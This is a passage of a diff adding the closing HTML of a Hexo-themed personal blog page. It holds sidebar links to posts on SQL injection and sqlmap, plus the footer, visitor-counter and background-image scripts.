href="/2016/10/21/第七季极客大挑战/">第七季极客大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/16/sqlmap常见使用语法/">sqlmap常见使用语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/15/sql绕过技巧/">sql绕过技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/22/sql盲注学习笔记/">sql盲注学习笔记</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2017 Isron
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
